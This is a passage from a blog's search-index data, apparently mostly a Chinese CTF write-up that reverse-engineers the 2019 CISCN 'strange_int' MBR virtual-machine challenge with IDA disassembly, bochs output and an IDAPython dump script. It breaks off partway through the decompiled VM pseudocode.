fa9a0a4228b987517bbefd53c530ff4fcd7dddb166460d412aa9d4e2adaef16a61dfe22ee168938eb1b12c3fb9855f2002b4ec98f4969b89d8400362edd6f0aa77fefac7ea62e7afc2b4f134fc8ad7f813e1a158a01e0391bb8c1d27ce3a0ed2a9186432601681728eac10cea29fe8603c7dfe9fc213ce4aeee5ceda163bccf2484c710a6393adfa3254c07ca22ef28a9f00d004766091246a788f9fb86fe4fe534c10e02632e39ea1a92229163dc53766ee1a356280390c71d86ad232772dd1cacca05764d56436ab38c85f18ea9a85196047c88d378fe690c6f7f04af790fee6b5dc2469bb237c1ed76d12de1dca6da09caef542ab847f0265aa8e696f9d1d6d6af9ebe42d014b52a6cbb7f3488a4073dbd5eef12a4529f9793ffb1771cfe21a357203a2fa714917014ff9d21219cae48306ed1393871dfa8b6bfb60e5e42bd3b98eb5df4278020d4832c4d434c6d65ffb6b5de54679fecffa6ebf842565602eecee3e486ecb86dfbe95260ccb57a626a4d1e95c235d9ce6cd0c6f4b522fc2b97869c774abaf2830483a01ada44aabd72187f2eceaa06f6fa6315838f479d84e4cb781185f2db4bc1d12fdc3a8c430949cf6ad404d9bce5328e64401b65c6058cc284953eb82d24fff62887e7ad3a590ea382a758bf09ebd95b2efd5e08d42d5fe74e874c1857afac23d2fb4fc5534f56b27e125509cd7e071e8da1becff3d7cc3a2af5b8d62a6ce1a2941c12f211c7dd4ed8602d01833e89ba362882aed63423de567254e741f5326119d63afc6dd15af6de3bd9143c663e195219ba8a2e868484da126be5883137bf4c0dbd9cad715a6df4b85e7cec2fe52b3fa43fe49d1bbe9dfff4952e32cad1a3ff2d59b1bf65a7ce43ee4cba30bbdb4dade8aab9ffef26a82b66f74bb72d640b2a096df79ec0bbea28788207ef5c97192764729680e17b4527fb62622c7f704225cc6e5a77ae69aa87a008f27ad63ced7095e32ddf0e3c447a0750cb6091159f4574e3b11366b86dc86219051070bf6bfccec20d5f63268fecf45d0bded5dc5c58e6131fa18c842146fe88329a917b047a530d5d9614466dec64647046eea732e4ea21a00540b72ff52d31e40075fdc0a44cb771f64c6abf571deb0a1e71e36c0c594a1ef342bf5907be49df3980b2dae9fe5dc8d2fbad466c10ee7e3b8b4d5f401a2f656ee7bd75e02ca341574f498393a5f5665ade9b5d3671552f0a89b25dc8b9a1038afa39fa4955528394badb21639e1f31613d74cc364a89350150228ea86b43ab2df6b0900ca7a5457d2635ce8fca422a57d4b90985ff2563c42bb241e91e50ccda065512705b02a41a65e557ef40d8dd7fd91dcc407ec21e82ebb3707e0e0ade20f61ff6ff5eb9e7428a2b5b0d52f1a096c7a9d5ee2af121c862d216716ccddb445d19fc2b8547339a6eddfe9fb4c348538f430e0b815a1cc12327e724c07607e3402459e30343dd51ead3ca68c71f7df8655ea556183daa203a098b86955a07944931a5d2efa2cd64d424e256b0e9bd8b44f35b957df6ee6a7e488b7ece3c53cde66f7942d2986703530e01e5c3c6588a615cc704a8bca4e47c5dd93600f250144ca2df0b0925b4258205e3331869184b26a4bd4aa8ce89eaba5ec28870e3198c7ee60a9eb86808394dd309aaaf1729185fd06627041365a9df95f318525644281d437e80c87ac60d1d2d19238cb16c7f35b95c9e1d604ead5f34576096e5e8ce2b856e15f32212e7e34acb79c8c2c084a220a3c4d19f29a40cc30fd20061eb902b81bd5287490b9fb2432427eb9bed4d57a98fb866833fca3397c992ebc1d0483e98054758988d4d1e757d2827279ad774c5b1fe9308bf50b635ca76cc1a3019d222fbc188e52fe1849bea1c4bcae4b826ea08b5f8b820b2c8291dae1d86ccfdbefcf29b232cb4f093807084e9cb11b3295cacdb468151366cddc2e3a2a59f14f682c04a9e4816e272292454938cf5f451ceda8d0c2442dfa62b7f5d8b5ea4ca89560000b2ad79f0e2186a1d8367233a0bef6535b773285c051e7215218417ae25150020f807ef3f48e56a2053c7def549bbb3aa53f7c5540f0c482544d32022a964b476e66611886fc61db761f83883bf29118c706a7bba8b06fdf4327283d1b10e000f9d3923cca61dbd907a1bb0496968193fa097b427ac776a35dfb5b4d6cad84fd0e60453daea916d14268152e0271b2fcf8ac14bc876adf3c92419cbb1efb6fffecdaec0f4406dbe028226219c4de023894d13ad0aeaf397b99f1847080ba5225e793d93473c0065afd257e97276a397104e9ab82238a51fc225104edcc8ea3414bcf4f3ffa846f78201b18a80a05b4b572c92603159dd90c88f49da476a353d747316b8834ca134ec9fd678a069d3c8ad2cd70d708bf914e9764b9873f26fe252f31a5d4b2eeb89e9595d53a83cb21fcefe897e628a7768603a404a8f95d945c3c1a257036560819cfd26bbf376d0108918a74fb1848e03b9578e6de73c011ad17d15badab28d4b876aace88d5cfef5de4b245f625a4e45967207369e6069aeff7e16602d3211973850e7de700df67a4eaf6cb60250efabfb0af6d59bc8a8bfc5eef095591faa55fbfd252e5f6a2bafce4e11aace2fb230d9c46f1025ce52a73b88fdc31620209cbbe25a217f4a683abf098a14e0d1dd018e80461f499fb174bdef360f764713d78e9643046dc950043a69fd28d60140d62d0d46b8b2d7534f9471935e0d03dfad53e94e3188eb4df94ec254d254b79eaac11add49b9423a7ba920d844e57f4c199f34c9574001935c3b801f2d75190c8defcbb38a30048c7ea287633b517eee2b2ba401ea24964d83cdf0c74dc855ff61d44fd95187a18b09c2c23a4ba2138f8ae092191337d0ec2a111edbaa1a5422c9f00f0ecb68e6837b771303bcd960312f17d070fc4c90c52ea26ddf43eac3a98572e0824eb1597e394a25a6aba21481ae502fe1b39138a6a99a31aaaf47a3c147ec6a148051dce18c23337a4b8397bc6429adea7221654f6feb86350462e3f164f1a720fc9b2dc692a5e1ab1369fb4b7acbc084a097e2787039a776d98425f29d544da661904645058435b3ea1a0d4e58781715c77dd77ed40b4eea349685316571a48db2803d35d0eb99d9e4cd9d74b73a0c53301ddcd7401ab006f1663f207505fede95bfac271659a77e70088daafb84858ee9f50d16f80fdbeae6a0239cae118e3a77a2b3b78c76e2be3f56077d25c9d190bd312f9abc6bb6cf32de077cae35635a8e2004a1ad1a8f7948d7bf33278e99bf5297aa67dce9337b0303708d6b15a729b6c4950d49836d6af8a3fbcfb36aa931db4d4955529b38bf49c802b2b05fbc928d52891c9693b7559fc12bf340eee85e975ae9feaf77e33a6fa3501ed7a562577cc8806193af5298d5c3448f2ec4243d160558098c86a6e6e5c34e7bd89ec2d0db543971afeec5262700123452a763914ce68b2b37a8407d946aabda7a55b4946664f0e292ee5e885cbd17b9e1aa941c7d8bc711c65874ea7d9ff9b13ffad8d49d61b5a2dcccd843fc4d38e171cf70a70148d2d80928c4f5f96683ab233908476edc7392c5597425fc6b4f4bf16602362760a64cd1751797d5bfe8a28669603a4775673517243b1fc0823969134a4c4a3a539070963ddb27628a5ad496c7c8ed6f76f98b7efa8405b5e8c5d385d03b2291910e1bc71082bc7eeb6021e6cfbb8199aed8fc659fbaf81fb67dc419c42f67fc7b641a6df69b46d2be8b968135134f12631d4516eacacd25daa50f47f1ed50300afd2e17b00ad23a319523209b537ee097614f0da728aeddcb4c9a965457044e188fb9289b68e3c7c8ce1d564bf843b95a9d54b6c5a17514112bc65de3bd0ef191c04cf628f3c12eccacb339860a6bb119b0889ee56a4378b7da09a382e02292ed8cfe6c721d4012c6fa0f333daaebdb43d08018aa30117e7dd04e0be51a9d2d32429000dbd833578a2f5b7a30e90ff915b80638d9a1bff89fdb66e0451eb3723d79f359a9e57aaf4a196","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"}]},{"title":"2019-CISCN-strange_int","slug":"2019-CISCN-strange-int","date":"2020-01-24T08:46:38.000Z","updated":"2020-01-27T03:42:36.631Z","comments":true,"path":"2020/01/24/2019-CISCN-strange-int/","link":"","permalink":"qianfei11.coding.me/2020/01/24/2019-CISCN-strange-int/","excerpt":"一道 MBR 虚拟机的题目，同时也熟悉了使用 bochs 对 MBR 的调试。","text":"一道 MBR 虚拟机的题目，同时也熟悉了使用 bochs 对 MBR 的调试。 Analysis12$ file Image.binImage.bin: DOS/MBR boot sector 先在 IDA 中 16 位的模式打开。在 7C00~7C0E 的代码（MBR 的加载地址是 0x7C00 处）是对寄存器和栈指针进行初始化操作；在 7C0F~7C12 的代码是 x86 系统中的第 17 号调用，设置了显示模式；在 7C14~7C24 的代码是 x86 系统中的第 20 号调用，从软盘的第 0 个磁盘第 0 个柱面第 2 个扇区开始的共 28 个扇区读取数据到内存的 10000000 处；在 7C2B~7C3B 的代码将内存中 10000000~10002000 的数据赋值给内存 0~2000 处；在 7C3D~7C47 的代码初始化 IDT 和 GDT；在 7C4C~7C52 的代码处，启动保护模式，并跳转至 32 位代码段： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162MBR16:0000 sub_0 proc nearMBR16:0000 jmp far ptr 7C0h:5MBR16:0000 sub_0 endpMBR16:0000MBR16:0005MBR16:0005 ; =============== S U B R O U T I N E =======================================MBR16:0005MBR16:0005MBR16:0005 sub_5 proc nearMBR16:0005 mov ax, csMBR16:0007 mov ds, axMBR16:0009 assume ds:MBR16MBR16:0009 mov ss, axMBR16:000B assume ss:MBR16MBR16:000B mov sp, 400hMBR16:000E cldMBR16:000F mov ax, 3MBR16:0012 int 10h ; - VIDEO - SET VIDEO MODEMBR16:0012 ; AL = modeMBR16:0014 mov dx, 0MBR16:0017 mov cx, 2MBR16:001A mov ax, 1000hMBR16:001D mov es, axMBR16:001F assume es:nothingMBR16:001F xor bx, bxMBR16:0021 mov ax, 228hMBR16:0024 int 13h ; DISK - READ SECTORS INTO MEMORYMBR16:0024 ; AL = number of sectors to read, CH = track, CL = sectorMBR16:0024 ; DH = head, DL = drive, ES:BX -&gt; buffer to fillMBR16:0024 ; Return: CF set on error, AH = status, AL = number of sectors readMBR16:0026 jnb short loc_2AMBR16:0028MBR16:0028 loc_28: ; CODE XREF: sub_5:loc_28↓jMBR16:0028 jmp short loc_28MBR16:002A ; ---------------------------------------------------------------------------MBR16:002AMBR16:002A loc_2A: ; CODE XREF: sub_5+21↑jMBR16:002A cliMBR16:002B mov ax, 1000hMBR16:002E mov ds, axMBR16:0030 assume ds:nothingMBR16:0030 xor ax, axMBR16:0032 mov es, axMBR16:0034 assume es:MBR16MBR16:0034 mov cx, 2000hMBR16:0037 sub si, siMBR16:0039 sub di, diMBR16:003B rep movsbMBR16:003D mov ax, 7C0hMBR16:0040MBR16:0040 loc_40: ; DATA XREF: sub_5+D↑rMBR16:0040 mov ds, axMBR16:0042 assume ds:nothingMBR16:0042 lidt fword ptr ds:6Fh ; Init IDTMBR16:0047 lgdt fword ptr ds:75h ; Init GDTMBR16:004CMBR16:004C loc_4C: ; DATA XREF: sub_5+1F↑rMBR16:004C mov ax, 1 ; Start Protected ModeMBR16:004F lmsw ax ; Jump to 32-bit CodeMBR16:004F sub_5 endpMBR16:004FMBR16:004F MBR16 ends 何为 IDT 和 GDT？GDT全局描述表（Global Descriptor Table）。在实时模式下，对一个内存地址的访问是通过段寄存器的方式来进行（一个段具备两个元素：[Base Address, Limit]），即段模式。而在保护模式下（保护模式运行在 32 位系统上），内存的管理模式分为两种，段模式和页模式，其中页模式也是基于段模式的（纯段模式和段页模式）。 在保护模式下，对一个段的描述则包括 3 方面因素：[Base Address, Limit, Access]，它们加在一起被放在一个 64-bit 长的数据结构中，被称为段描述符。而段寄存器仍然是 16-bit，无法通过 16-bit 长度的段寄存器来直接引用 64-bit 的段描述符。 解决方法就是把这些长度为 64-bit 的段描述符放入一个数组即 GDT 中。当程序员通过段寄存器来引用一个段描述符时，CPU 必须知道 GDT 的入口，也就是基地址放在哪里，所以 Intel 的设计者门提供了一个寄存器 GDTR 用来存放 GDT 的入口地址，程序员将 GDT 设定在内存中某个位置之后，可以通过 LGDT 指令将 GDT 的入口地址装入此寄存器，从此以后，CPU 就根据此寄存器中的内容作为 GDT 的入口来访问 GDT 了。 IDT中断描述符表（Interrupt Descriptor Table），和 GDT 类似，记录了 0~255 的中断号和调用函数之间的关系。 段描述符使用数组存储，使用 LIDT 指令将 IDT 的入口地址装入 IDTR 寄存器。 接下来在 IDA 中用 32 位模式打开。一开始的一段代码对 IDT 和 GDT 进行了初始化： 1234567891011121314151617seg001:00000205 sub_205 proc nearseg001:00000205 mov ds, eaxseg001:00000207 lss esp, fword ptr ds:dword_B34+28hseg001:0000020E call IDT_Initseg001:00000213 call GDT_Initseg001:00000218 mov eax, 10h ; DATA XREF: sub_28B+27↓rseg001:0000021D mov ds, eaxseg001:0000021F assume ds:nothingseg001:0000021F mov es, eaxseg001:00000221 assume es:nothingseg001:00000221 mov fs, eax ; DATA XREF: sub_283↓rseg001:00000223 assume fs:nothingseg001:00000223 mov gs, eaxseg001:00000225 assume gs:nothingseg001:00000225 lss esp, large ds:0B5Chseg001:00000225 ; DATA XREF: sub_28B+11↓oseg001:0000022C xor ebx, ebx IDT_init 处，先将 000800FC 赋给了 EAX，将 8E00 赋给了 DX。然后进行了一个 256 次的循环，每次循环从 00080128 的地址开始，分别存入 EAX 和 EDX。最后加载 IDTR，地址为 11C。 1234567891011121314151617seg001:0000028B IDT_Init proc near ; CODE XREF: sub_205+9↑pseg001:0000028B mov edx, 0FChseg001:00000290 mov eax, 80000hseg001:00000295 mov ax, dxseg001:00000298 mov dx, 8E00hseg001:0000029C lea edi, ds:128hseg001:000002A2 mov ecx, 100hseg001:000002A7seg001:000002A7 loc_2A7: ; CODE XREF: IDT_Init+25↓jseg001:000002A7 mov [edi], eaxseg001:000002A9 mov [edi+4], edxseg001:000002AC add edi, 8seg001:000002AF dec ecxseg001:000002B0 jnz short loc_2A7seg001:000002B2 lidt large fword ptr ds:11Chseg001:000002B9 retnseg001:000002B9 IDT_Init endp 在 bogus 中调试得到 IDTR 中的值为 0x012807ff（可以使用 show mode 命令来判断实模式向保护模式的转换）。依据之前的知识，可以知道基址为 0x0128 以及长度为 0x07ff： 123&lt;bochs:40&gt; x 0x11c[bochs]:0x000000000000011c &lt;bogus+ 0&gt;: 0x012807ff 中断门描述符被初始化为 0000 8e00 0008 00fc（偏移：0xfc；段选择符：0x8；P：1，即段是否在内存；DPL：0），如下： 1234567&lt;bochs:79&gt; x/20 0x128[bochs]:0x0000000000000128 &lt;bogus+ 0&gt;: 0x000800fc 0x00008e00 0x000800fc 0x00008e000x0000000000000138 &lt;bogus+ 16&gt;: 0x000800fc 0x00008e00 0x000800fc 0x00008e000x0000000000000148 &lt;bogus+ 32&gt;: 0x000800fc 0x00008e00 0x000800fc 0x00008e000x0000000000000158 &lt;bogus+ 48&gt;: 0x000800fc 0x00008e00 0x000800fc 0x00008e000x0000000000000168 &lt;bogus+ 64&gt;: 0x000800fc 0x00008e00 0x000800fc 0x00008e00 GDT_init 处，加载 GDTR 的地址为 122： 1234seg001:00000283 GDT_Init proc near ; CODE XREF: sub_205+E↑pseg001:00000283 lgdt large fword ptr ds:122hseg001:0000028A retnseg001:0000028A GDT_Init endp 同理，可以知道 GDT 基址为 0x0928 以及长度为 0x001f。不过这里没有对 GDT 进行初始化： 123&lt;bochs:74&gt; x 0x122[bochs]:0x0000000000000122 &lt;bogus+ 0&gt;: 0x0928001f 在 22E~25F 的代码执行了一个 16 次的循环，其中 0x21~0x30 的中断向量描述符在内存的原始位置在 D08 处，循环中将每个中断向量存储到 128 处；然后调用了 NextHandler 函数，最后调用 INT 21H。 123456789101112131415161718192021222324seg001:0000022E loc_22E: ; CODE XREF: sub_205+58↓jseg001:0000022E nopseg001:0000022F cmp ebx, 10hseg001:00000232 jge short loc_25Fseg001:00000234 mov eax, 80000hseg001:00000239 lea edx, ds:0D08h[ebx*4]seg001:00000240 mov edx, [edx]seg001:00000242 mov ax, dxseg001:00000245 mov dx, 8E00hseg001:00000249 mov ecx, 21h ; &apos;!&apos;seg001:0000024E add ecx, ebxseg001:00000250 lea esi, ds:128h[ecx*8]seg001:00000257 mov [esi], eaxseg001:00000259 mov [esi+4], edxseg001:0000025C inc ebxseg001:0000025D jmp short loc_22Eseg001:0000025F ; ---------------------------------------------------------------------------seg001:0000025Fseg001:0000025F loc_25F: ; CODE XREF: sub_205+2D↑jseg001:0000025F ; sub_205+61↓jseg001:0000025F call NextHandlerseg001:00000264 int 21h ; DOS -seg001:00000266 jmp short loc_25Fseg001:00000266 sub_205 endp 获取得到所有中断向量的地址如下： 123456789101112131415161718...IDT[0x21]=32-Bit Interrupt Gate target=0x0008:0x00000b7c, DPL=0IDT[0x22]=32-Bit Interrupt Gate target=0x0008:0x00000b8a, DPL=0IDT[0x23]=32-Bit Interrupt Gate target=0x0008:0x00000ba1, DPL=0IDT[0x24]=32-Bit Interrupt Gate target=0x0008:0x00000bc1, DPL=0IDT[0x25]=32-Bit Interrupt Gate target=0x0008:0x00000be1, DPL=0IDT[0x26]=32-Bit Interrupt Gate target=0x0008:0x00000bfc, DPL=0IDT[0x27]=32-Bit Interrupt Gate target=0x0008:0x00000c17, DPL=0IDT[0x28]=32-Bit Interrupt Gate target=0x0008:0x00000c32, DPL=0IDT[0x29]=32-Bit Interrupt Gate target=0x0008:0x00000c4f, DPL=0IDT[0x2a]=32-Bit Interrupt Gate target=0x0008:0x00000c6c, DPL=0IDT[0x2b]=32-Bit Interrupt Gate target=0x0008:0x00000c84, DPL=0IDT[0x2c]=32-Bit Interrupt Gate target=0x0008:0x00000c96, DPL=0IDT[0x2d]=32-Bit Interrupt Gate target=0x0008:0x00000cb5, DPL=0IDT[0x2e]=32-Bit Interrupt Gate target=0x0008:0x00000cf7, DPL=0IDT[0x2f]=32-Bit Interrupt Gate target=0x0008:0x00000ce0, DPL=0IDT[0x30]=32-Bit Interrupt Gate target=0x0008:0x00000cd4, DPL=0... 在 IDA 中定位到所有中断向量的地址，分别对应着不同的函数，这一段代码后面会用到： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111seg001:00000D7C lea ecx, ds:0B64h[ecx*4]seg001:00000D83 mov [ecx], eaxseg001:00000D85 jmp loc_EF8seg001:00000D8A ; ---------------------------------------------------------------------------seg001:00000D8A lea eax, ds:0B64h[eax*4]seg001:00000D91 mov eax, [eax]seg001:00000D93 lea ecx, ds:0B64h[ecx*4]seg001:00000D9A mov [ecx], eaxseg001:00000D9C jmp loc_EF8seg001:00000DA1 ; ---------------------------------------------------------------------------seg001:00000DA1 lea eax, ds:0B64h[eax*4]seg001:00000DA8 mov eax, [eax]seg001:00000DAA lea ecx, ds:0B64h[ecx*4]seg001:00000DB1 lea eax, ds:0D48h[eax*4]seg001:00000DB8 mov eax, [eax]seg001:00000DBA mov [ecx], eaxseg001:00000DBC jmp loc_EF8seg001:00000DC1 ; ---------------------------------------------------------------------------seg001:00000DC1 lea eax, ds:0B64h[eax*4]seg001:00000DC8 mov eax, [eax]seg001:00000DCA lea ecx, ds:0B64h[ecx*4]seg001:00000DD1 mov ecx, [ecx]seg001:00000DD3 lea ecx, ds:0D48h[ecx*4]seg001:00000DDA mov [ecx], eaxseg001:00000DDC jmp loc_EF8seg001:00000DE1 ; ---------------------------------------------------------------------------seg001:00000DE1 lea eax, ds:0B64h[eax*4]seg001:00000DE8 mov edx, [eax]seg001:00000DEA lea ecx, ds:0B64h[ecx*4]seg001:00000DF1 mov eax, [ecx]seg001:00000DF3 add eax, edxseg001:00000DF5 mov [ecx], eaxseg001:00000DF7 jmp loc_EF8seg001:00000DFC ; ---------------------------------------------------------------------------seg001:00000DFC lea eax, ds:0B64h[eax*4]seg001:00000E03 mov edx, [eax]seg001:00000E05 lea ecx, ds:0B64h[ecx*4]seg001:00000E0C mov eax, [ecx]seg001:00000E0E sub eax, edxseg001:00000E10 mov [ecx], eaxseg001:00000E12 jmp loc_EF8seg001:00000E17 ; ---------------------------------------------------------------------------seg001:00000E17 lea eax, ds:0B64h[eax*4]seg001:00000E1E mov edx, [eax]seg001:00000E20 lea ecx, ds:0B64h[ecx*4]seg001:00000E27 mov eax, [ecx]seg001:00000E29 xor eax, edxseg001:00000E2B mov [ecx], eaxseg001:00000E2D jmp loc_EF8seg001:00000E32 ; ---------------------------------------------------------------------------seg001:00000E32 lea eax, ds:0B64h[eax*4]seg001:00000E39 mov eax, [eax]seg001:00000E3B lea edx, ds:0B64h[ecx*4]seg001:00000E42 mov cl, alseg001:00000E44 mov eax, [edx]seg001:00000E46 shl eax, clseg001:00000E48 mov [edx], eaxseg001:00000E4A jmp loc_EF8seg001:00000E4F ; ---------------------------------------------------------------------------seg001:00000E4F lea eax, ds:0B64h[eax*4]seg001:00000E56 mov eax, [eax]seg001:00000E58 lea edx, ds:0B64h[ecx*4]seg001:00000E5F mov cl, alseg001:00000E61 mov eax, [edx]seg001:00000E63 shr eax, clseg001:00000E65 mov [edx], eaxseg001:00000E67 jmp loc_EF8seg001:00000E6C ; ---------------------------------------------------------------------------seg001:00000E6C lea eax, ds:0B64h[eax*4]seg001:00000E73 mov eax, [eax]seg001:00000E75 lea ecx, ds:0B64h[ecx*4]seg001:00000E7C mov edx, [ecx]seg001:00000E7E and eax, edxseg001:00000E80 mov [ecx], eaxseg001:00000E82 jmp short loc_EF8seg001:00000E84 ; ---------------------------------------------------------------------------seg001:00000E84 lea eax, ds:0B64h[ecx*4]seg001:00000E8B mov eax, [eax]seg001:00000E8D lea ecx, dword_B34+44hseg001:00000E93 mov [ecx], eaxseg001:00000E95 iretseg001:00000E96 ; ---------------------------------------------------------------------------seg001:00000E96 lea eax, ds:0B64h[eax*4]seg001:00000E9D mov eax, [eax]seg001:00000E9F test eax, eaxseg001:00000EA1 jnz short loc_EF8seg001:00000EA3 lea eax, ds:0B64h[ecx*4]seg001:00000EAA mov eax, [eax]seg001:00000EAC lea ecx, dword_B34+44hseg001:00000EB2 mov [ecx], eaxseg001:00000EB4 iretseg001:00000EB5 ; ---------------------------------------------------------------------------seg001:00000EB5 lea eax, ds:0B64h[eax*4]seg001:00000EBC mov eax, [eax]seg001:00000EBE test eax, eaxseg001:00000EC0 jz short loc_EF8seg001:00000EC2 lea eax, ds:0B64h[ecx*4]seg001:00000EC9 mov eax, [eax]seg001:00000ECB lea ecx, dword_B34+44hseg001:00000ED1 mov [ecx], eaxseg001:00000ED3 iretseg001:00000ED4 ; ---------------------------------------------------------------------------seg001:00000ED4 lea eax, unk_F94seg001:00000EDA call sub_2EAseg001:00000EDF hltseg001:00000EE0 ; ---------------------------------------------------------------------------seg001:00000EE0 lea eax, unk_FA0seg001:00000EE6 call sub_2EAseg001:00000EEB lea eax, word_FAEseg001:00000EF1 call sub_2EAseg001:00000EF6 hlt 接下来在 NextHandler 处，包括 INT 21H 的三条指令，类似于一个 switch 语句，根据以前的做题经验，基本可以判断出是个虚拟机。在 NextHandler 函数中，首先从 B78 处获取值作为 D48 的偏移，将 D48 处的值分别赋值给 给 065（操作符）、ecx（操作数 1）、eax（操作数 2），而 065 地址处的值为 21H，即指令 INT 21H 的操作数，故这里中断的调用是和 edi 的取值有关系的： 123456789seg001:00000268 NextHandler proc near ; CODE XREF: sub_205:loc_25F↑pseg001:00000268 mov edi, large ds:0B78hseg001:0000026E lea edi, ds:0D48h[edi*4]seg001:00000275 mov eax, [edi]seg001:00000277 mov large ds:65h, alseg001:0000027C mov ecx, [edi+4]seg001:0000027F mov eax, [edi+8]seg001:00000282 retnseg001:00000282 NextHandler endp 回过去看上面中断代码的最后一部分是将上面 edi 中的值加 3，即取下一组指令： 1234567seg001:00000EF8 loc_EF8: ; CODE XREF: seg001:00000D85↑jseg001:00000EF8 ; seg001:00000D9C↑j ...seg001:00000EF8 lea ecx, dword_B34+44hseg001:00000EFE mov eax, [ecx]seg001:00000F00 add eax, 3seg001:00000F03 mov [ecx], eaxseg001:00000F05 iret 那么之前的那段代码就是不同的操作符时进行的中断调用。这里就先把每个中断的部分的代码进行翻译（buf 的地址为 B64，code 的地址为 D48，pc 的地址为 B78）： 中断编号 功能描述 0x21 buf[a] = b 0x22 buf[a] = buf[b] 0x23 buf[a] = code[buf[b]] 0x24 code[buf[a]] = buf[b] 0x25 buf[a] += buf[b] 0x26 buf[a] -= buf[b] 0x27 buf[a] ^= buf[b] 0x28 buf[a] &lt;&lt;= buf[b] 0x29 buf[a] &gt;&gt;= buf[b] 0x2A buf[a] &amp;= buf[b] 0x2B pc = a 0x2C if(buf[b] == 0) pc = buf[a] 0x2D if(buf[b] != 0) pc = buf[a] 0x2E 终止 CPU 运行，即 hlt 指令 0x2F 输出 flag 正确提示 0x30 输出 flag 错误提示 根据上面的分析，用 IDAPython 把虚拟机指令 dump 下来： 123456789code = []for addr in range(0x0F48, 0x11E0, 12): ins = Dword(addr) op1 = Dword(addr + 4) op2 = Dword(addr + 8) code.append(ins) code.append(op1) code.append(op2)print code 然后用脚本处理一下，得到伪代码：buf[0] = 129buf[1] ^= buf[1]code[buf[1]] = buf[1] # 0buf[2] = code[buf[0]] # ('Read code, offset:', '129')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '129')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '130')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '130')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '131')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '131')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '132')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '132')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '133')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '133')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '134')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '134')buf[1] = 1buf[0] += buf[1]buf[1] = buf[0]buf[2] = 129buf[1] -= buf[2]buf[2] = 9buf[1] -= buf[2]buf[2] = 9if buf[1] != 0: pc = buf[2] # jmp 9buf[2] = code[buf[0]] # ('Read code, offset:', '135')buf[3] = buf[2]buf[4] = 8buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] &lt;&lt;= (buf[4] &amp; 0xFF)buf[2] ^= buf[3]buf[3] ^= buf[3]buf[4] = code[buf[3]] # 0code[buf[3]] = buf[2] # 0buf[2] ^= buf[4]code[buf[0]] = buf[2] # ('Write code, offset:', '135')buf[1] = 1buf[0] += buf[1]buf[1] = 